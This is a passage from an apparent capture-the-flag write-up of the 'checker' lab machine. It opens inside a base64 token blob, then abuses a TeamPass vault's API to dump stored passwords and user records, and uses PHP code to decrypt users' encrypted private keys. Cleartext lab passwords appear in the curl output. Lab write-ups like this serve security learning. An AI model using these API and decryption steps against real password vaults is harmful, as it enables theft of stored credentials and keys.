HBwY0RKTVMxbDBiQTBLYjBKNlFYUnFaSG93ZGpVNU4yNHJNWGhsZFZSUVNVOHhSMWhJUkdKdGVWUjVjVEpqY1RkVU1qUlBkelppUm1WbE5XeEZlbEJVZGxBeVpHdERRWGRGUVEwS1FWRkxRMEZuUVRKalkxTmFTbTAwV0V4Q2VYZFFNa3hETW5CVE1YWkhabVJvVUZaNGFEaFFkMEpwVTBrMGJqRllhSFpRYlVNMFdtSXpUemh6VDI5R1J3MEtWRk5NZFRnd01tMVhabmxGTW5wTWNscG9ZVWhZYm5aV1dqSmtURzV6TkV0amMwOW9VRE5NYmpGSlNIVmFTbEJVUzFjMFRtOUZVbWRQYUdaVFpXWnhNQTBLYzJNNVlWaFphV1YxT0RGbGNrVXJkVlpGUjBjNVRXSTRSbVJZT1hwUWJuSmlTVVpIVkhaQ1JHMTVhM2xEUjJVNVdFaGtWakpOTUUxek1HdDFaMEpGVncwS05YRkljams0VWpWcWFrMHdhREpDY0V0NlJua3hWMDV6UlhSdGFEWlBaVGRqU25ZMVZGUTBWMFJrVkRRdk1rWkVVRXRDZUM4MFVFbHRSMUpWTmpNeFVRMEtjbGRJVlhGcVIycFhNMnA0TkVwMFMzaDJWRmRIV214SmRFNTBWM2hhUmpjMFNqWlVaM1E1UTJsNlRtVkdNR2hvVFZSVWRqTlZPSHBLVWpacWIxTmFNQTBLVUVaaE0zUnRabE56Y1VSb09YZFFTa1Y0SzJaeGMwbFphMmt2Y1haME1tcHBOV2hQZW1NNE5IRnNSSFZ6VVhnNFVWSTNibWN6TWpoWU1FZEZXWFowVEEwS2IxazNRbE5RWmtkVGFEaElUMDlzVDIxWFJVWldiRXBhT1d0bmNVTkRjekphT0dsa09HVkxlUzlGV2tka1dWbHNiMkpwYlhGbmFFTnZWbmxNZFRKSlpBMEtVazlJUkRoM2EyOXNXWGRzZWpkamRFazRaRGgzYVhoaFNHc3JkSGg0ZFV4c2JVTjNlazloUldSeFRIQTVaRFpFVWk5MWVuVlhhakozU1ZjMEwyeE1NdzBLWlUxTGFHbFdSbmhFVlVsNVVVTlVWbXRRTUV0TUt6Smlka3Q2SzJJeGIzQXhiWHBXWld4T1NXbzJZVXR0UmxoWU56a3ZlWE5yWWpsdllVRnNWWGhSV1EwS01HcFZaRFU1V1ZkNlZrRmtiVnBOWnpkUGRsWXJkUzlTU1hjM1drMXhOR3A1VVZoWFZWRmFOMGhqTkRSQmJWUkVNVWh2ZVVkYVEwODBNbVZKTlZneFZ3MEtaMmRIVVRsVFlVUmxTV2RPU0hSaGRXcEdaMjFIVjI5bWJHMU1iSEZSTm1GSlpESjZVbE53VFdRdmNGVllWMDh5V0ZGTFEwRlJSVUUzWlU4eWNVRTVaUTBLVFhvd1RITkRTRE5SYUhKS1drbzJVRVZZZG5GV2JDOXVRaXREYzFJcmNtbFNPRXgwVlZCcFUxQXpiRUZXVDJ0eU1ESmxlVVYwWjJaTVZ6VjJTeTlxVXcwS2FUbGlNbU5HTjJrMk1HNWlSVkoyY3pSNVoyTjVkbUlyYTNWeWRVc3ZTMWQzUTFCMVYxcHlaMU5rV1RSUGMzZFJZekZ3VjBwMk4wZHVZMU14TlZVdk1nMEtPRkZZVlhOMFptdHRTV0ZYWlV4M1pteHJlbkF5Y1ZaeFdpOHhlR1JsZDBkdU0zbEZVR2szWmpBNVRXMHphbHBYU0hGc2RUVm9iRVJtVmpCRlRYUkdUdzBLVTFWek5IQk9kbXhFTlUxUGFsWjJSR1EzVjBzNGNVNUxVMjVDZEdVME1FdFBURTFTV21JcllUZ3hSVVYwZVZSVldYVlFSMkZaTm0xSFoycHJOMlZ2YUEwS1dGQnVSaXRUTkVkbFIwbEZhRWRIVlVzeFpqUnJlRWhPWW5VM2NVVkNOR2xMTTB4emRubEVkV2hTVkdkTWJ6QkZaMHA0Wm1rMWNtRllNaXQ1Wmk4d1FnMEtiMFJOUm5GSU1rOVFUVFo2UmxGTFEwRlJSVUVyWTB4VVZVSkxablk1ZDB4Nk9IYzVTVVJOV1VjM1Z6SjFNRlpDYzBsc1ltRm9hR1ZaY1Zaa2EwOUNVdzBLZHpWRGExcHdiWE5MZFRCTlpWVm1PVXhMTXpjelZrSjBXVU5XTWxsS0syZDBTM3BJU1U5R05HSnlZbkZzSzBsRU1YY3JSVTk1TnpSalpTOXVVMlZqTmcwS2NqZ3JjWFo0Y0RJNFQyTnJibkIwWlhaSWJUaFpUM052YldOVmJIZ3ZZMWd5YjFVeGMxZEpjalJDY1c1RGJWbG9NRWwzZG1KRFpFUnNPVVUxTTBkdVR3MEtOMGRIVUZrMmJGTlBjMkZxTlcwdmJIazFNVmxVTkZRME5ITXlaMmxwWlc1RlpWb3JURE5oSzJSa1dUWmhjemRuUzJSclZHMXFRMmxIVkRoa2VVOTZPQTBLWTFBeVZraG9PVWh2VkhwclMwMDNaa1JRZFN0UVVFTldhMjUwTWs4eGNVRjJSWEUzY1ZKUloyaGpOWGhhYURkTFRtbHVXVWxJS3k5a1ZtZEZjWEpHVFEwS1NsSjBZamhEY2tnelFWaENReTg0WnpCMk5tOVJiRmw0V0M5a1dVUXphRFEzTUhwRlozSXhUWFJSUzBOQlVVSk5aMHhMTlVWV1oyd3JhbVpOUTA5Q1VBMEtZbVpZWlZkbEswRnRLekJqYjJaTVYxbGlZVVl5YXl0NU4wVnJUbWhUVEdwTWMyTXhhREZqUlhkYVFrODFlRzR2Y210bmNWSXZZazQyWlN0UE5qZFViUTBLU0daYVNscHJWMnRPTnpSeGREUjJaa00xV2xWdk9ITXZUakEzY20xb1kxQktPR3RzWmpSTE5qRm5OVzEwUVVORWRFVk5ZVE00UWpKbGJqSlJiR3RXTlEwS2JEWTNSVmhTZERkYWJta3JVeTkzVVZCVU1VUjNkMlpQVDIxcU9EVnROSE16VUdKbE9UTktlVzlsU2poT1VuVjZUVlJ4YzJKUmRGVklkRU13YXpsTWVRMEtWVEJUVjNsVEwzWlRNemRJTUZOUFVFWlBSR2R1ZEdKMWNsRmxibEpTY3pkeVNUVnljRE5vTVRWUVNtdzVLelJMTmxac1ZpdGliVXBCVUhCa2VrTk9adzBLYVRSVlVWaGhSV016TUcxa1dXeG9RMjFMY2taVVEzVkpPVmxwVmxoeE0xZE9iMUo0T0M4dlEzSkpZemxwYVhNMFJHUXZSbk5WVUZsc1VTODBkelJtS3cwS2JtbHhVa0Z2U1VKQlVVUjJPVE00SzBKT1lsWTJUall3V2xWQmNHbHpNMVFyWkVFMmREZDZOR3c1UW5JM1JWQnlUbGxVYW1GS1VUaGlLMFl3TjNCellnMEtiSGwzVURkMGJsTk1jM1UyUWsxa1FuaEdlWEpWTVU0NWNFTXJhV0ZPT1d0VFNIa3pUbmxIU0ZwT1NXZGFkVEoyTUhSaUwwTTFielJTZVdRdlpYcGlhUTBLUjAxTU0xaE5TVEpDYVZNeldHUnNhR1pMYW1wTGIxbFNiakJHUzFRNE9Xd3ZNVmRWZVZSSlpVSkZTMmRCUlRKVFRsTlZTbTRyVGlzckwwWm1lVTVTU0EwS2QyOXFRa2syZFNzMlZYUnlRVFZDTlc5VFZtODVPVmwxWm1FeWNHWnpXbHAzTVROWVRucE1ja2xxVlZOU1ZETktWV1p2VmtSYVZYbEliMHBEVFdJeVNnMEtjbXMxY3pSMU5IUjBSVnBCYlUxeGMzUmtRMUZGUmtZeVJqZDFZMHBOYkcxd2ExbFFNM1U1WTBGUVNURnlNbVpPYmpaaVJVNWFjVFpaUlVsRFV6Wm9RUTBLZG05eFVFMTVOV1poZFhSUk5sTXlRbFJqTW1VNU5XOURSMVpyU2xsRlYzUkJiMGxDUVVJeGExTmpWeTlPVWpBMWRVOVFOWFZrUkVKYVozSnNNeTl4WmcwS1VsSjNka2g2ZDFWV1ZGaFpiM2xMV25CQ05qUnVORnBZZWtkM1EwNXBSa2R3YjJwSWVIQnJUVlppZDA5c1FUVlJTM3BQVkU5bE4yWnlVV3hTTW0weWF3MEtPR3hOU0RNeE5IcExMMEZ5VTNSMVVUTlJkbTVVV0VKVFMwVjVhV3hKVEM5T1VUQk9XRGRCU1dsNFdqRjVVVzEwVFZjM2NtVjZUelJ0ZEhsMFoyNWhjdzBLYW5OWGVXVk1TbEoyZEV4d1l6RXZWbTgwTHpkV1RIRnNNalUyUmtoVmNGWmpWMHBsZFZwMFVYWk9jQ3RCUjB4NlV6TlVlR2hNVFhoWkszTjNXSGx5VUEwS2FqUk9ielp0TDBKUVRTdHJRMnh3VUhSaVVuUTBNbTB4VTBOWWFUWkJXakIxVERjeE5tVlRZWFY2WTJWbVlVTlNjVTVXZDNSMEx6TkViRWhLVG5GblRRMEtNVXRxYWt4SVYyWmFlRWRQYXpSU05uTnZjVTg1Y204M2RsWjJNMUo2WTBSUGJ5dEVhU3RaYTNSUVRURk9Xa2hzT0ZSVFpYcE1OMkp6VFdzOURRb3RMUzB0TFVWT1JDQlNVMEVnVUZKSlZrRlVSU0JMUlZrdExTMHRMUT09IiwicGZfZW5hYmxlZCI6MCwiZm9sZGVyc19saXN0IjoiMSJ9.0aaoB0LlVS03oDP7XFRFb_0vI2Djcu0OlOwxxHEquc4"}
```

From `archive.org` I managed to find the last update to the api page during the year 2022. Here I could see how to use the api properly for this version, but I wanted to see more, and when skipping to 15th june 2023 the API contained more information such as how to get items and list items:  
https://web.archive.org/web/20230615063136/https://documentation.teampass.net/#/api-basic

I managed to list items with

```
<Teampass url>/api/index.php/item/inFolders?folders={590,12}
```

So perhaps other calls via the api also works?

```
➜  checker curl -X GET "http://vault.checker.htb:8080/api/index.php/item/inFolders?folders={1,2,3,4,5,6,7,8,9,10}" -H "Authorization: Bearer <insert token here>"
[{"id":1,"label":"boosktack login","description":"","pwd":"mYSeCr3T_w1kI_P4sSw0rD","url":"http:\/\/checker.htb","login":"bob@checker.htb","email":"bob@checker.htb","viewed_no":21,"fa_icon":"","inactif":0,"perso":0},{"id":2,"label":"ssh access","description":"","pwd":"hiccup-publicly-genesis","url":"","login":"reader","email":"","viewed_no":13,"fa_icon":"","inactif":0,"perso":0}]%
```

Finally I ended up listing the users via the API and found the following information, which notably contained a **private key**. 
```json
[
    {
        "id": 1,
        "login": "admin",
        "pw": "[omitted]",
        "groupes_visibles": "0",
        "derniers": null,
        "key_tempo": "",
        "last_pw_change": "1718215320",
        "last_pw": null,
        "admin": 1,
        "fonction_id": "",
        "groupes_interdits": null,
        "last_connexion": "1718521014",
        "gestionnaire": 0,
        "email": "",
        "favourites": null,
        "latest_items": null,
        "personal_folder": 0,
        "disabled": 0,
        "no_bad_attempts": 0,
        "can_create_root_folder": 1,
        "read_only": 0,
        "timestamp": "",
        "user_language": "0",
        "name": "",
        "lastname": "",
        "session_end": "",
        "isAdministratedByRole": 0,
        "psk": null,
        "ga": null,
        "ga_temporary_code": "none",
        "avatar": null,
        "avatar_thumb": null,
        "upgrade_needed": 0,
        "treeloadstrategy": "full",
        "can_manage_all_users": 0,
        "usertimezone": "not_defined",
        "agses-usercardid": "0",
        "encrypted_psk": "",
        "user_ip": "",
        "user_ip_lastdate": null,
        "user_api_key": "none",
        "yubico_user_key": "none",
        "yubico_user_id": "none",
        "public_key": "[omitted]",
        "private_key": "[omitted]",
        "special": "none",
        "auth_type": "local",
        "is_ready_for_usage": 0,
        "otp_provided": 0
    },
	[omitted]
    {
        "id": 10000000,
        "login": "bob",
        "pw": "[omitted]",
        "groupes_visibles": "1",
        "derniers": null,
        "key_tempo": "NhFgYxxzyya6QMe8ByVXJ7YwmhGc7HKQh97hftBHrXMQMstWP6",
        "last_pw_change": "1718215955",
        "last_pw": null,
        "admin": 0,
        "fonction_id": "1",
        "groupes_interdits": "",
        "last_connexion": "1740714208",
        "gestionnaire": 0,
        "email": "bob@checker.htb",
        "favourites": null,
        "latest_items": "2;1",
        "personal_folder": 0,
        "disabled": 0,
        "no_bad_attempts": 0,
        "can_create_root_folder": 0,
        "read_only": 1,
        "timestamp": "1740714209",
        "user_language": "english",
        "name": "bob",
        "lastname": "bob",
        "session_end": "1740717808",
        "isAdministratedByRole": 0,
        "psk": null,
        "ga": null,
        "ga_temporary_code": "none",
        "avatar": null,
        "avatar_thumb": null,
        "upgrade_needed": 0,
        "treeloadstrategy": "full",
        "can_manage_all_users": 0,
        "usertimezone": "not_defined",
        "agses-usercardid": "0",
        "encrypted_psk": "",
        "user_ip": "",
        "user_ip_lastdate": null,
        "user_api_key": "[omitted]",
        "yubico_user_key": "none",
        "yubico_user_id": "none",
        "public_key": "[omitted]",
        "private_key": "[omitted]",
        "special": "none",
        "auth_type": "local",
        "is_ready_for_usage": 0,
        "otp_provided": 0
    }
]
```

I could see that the private key was used in various places, and also saw that it could be decrypted:

Found in main.functions.php (for version 3.0.0.21 of TeamPass)

```
function decryptPrivateKey(string $userPwd, string $userPrivateKey)
{
    // Sanitize
    $antiXss = new AntiXSS();
    $userPwd = $antiXss->xss_clean($userPwd);
    $userPrivateKey = $antiXss->xss_clean($userPrivateKey);

    if (empty($userPwd) === false) {
        // Load classes
        $cipher = new Crypt_AES();
        // Encrypt the privatekey
        $cipher->setPassword($userPwd);
        try {
            return base64_encode((string) $cipher->decrypt(base64_decode($userPrivateKey)));
        } catch (Exception $e) {
            return $e;
        }
    }
    return '';
}
```

Since I found the private key for both `bob` and `admin` via the API, I decided to decrypt them.  
I modified the function found in https://github.com/nilsteampassnet/TeamPass/blob/3.0.0.21/sources/main.functions.php a bit and installed required dependencies such as `phpseclib 2.0.*` in a custom php project with the appropriate structure and files.

```
<?php
include_once __DIR__.'/../vendor/autoload.php';
use phpseclib\Crypt\AES as Crypt_AES;

function decryptPrivateKey(string $userPwd, string $userPrivateKey): string
{
    if (empty($userPwd) === false) {
        $cipher = new Crypt_AES();
        $cipher->setPassword($userPwd);

        try {
            // Decrypt the private key
            $decryptedKey = $cipher->decrypt(base64_decode($userPrivateKey));
            echo "\n\n$decryptedKey\n\n";
            return base64_encode((string) $decryptedKey);
        } catch (Exception $e) {
            return $e->getMessage(); 
        }
    }
    return ''; 
}

```

Then I invoked it with a small script which both prints the base64 version and the non-base64 version.

```
<?php
require 'vendor/autoload.php';

$userPwd = "<insert-user-password-here>";
$userPrivateKey = "<insert-user-secret-key-here>"

$decryptedKey = decryptPrivateKey($userPwd, $userPrivateKey);
echo "Decrypted Private Key:\n";
echo $decryptedKey;
?>
```

Then I ran it with:

```
(checker) ➜  project php decrypt_userkey.php                      
-----BEGIN RSA PRIVATE KEY-----
[output omitted]
-----END RSA PRIVATE KEY-----

Decrypted Private Key:
[output omitted]
```

I attempted to use the b64encoded key to generate an otp using the google authenticator app, but the generated code didn't work. Neither did it via `pyotp`. It also didn't work to supply the private key when connecting using `ssh reader@10.10.11.56`.

Since I didn't have the password for `admin`, it was unnecessary to test that.
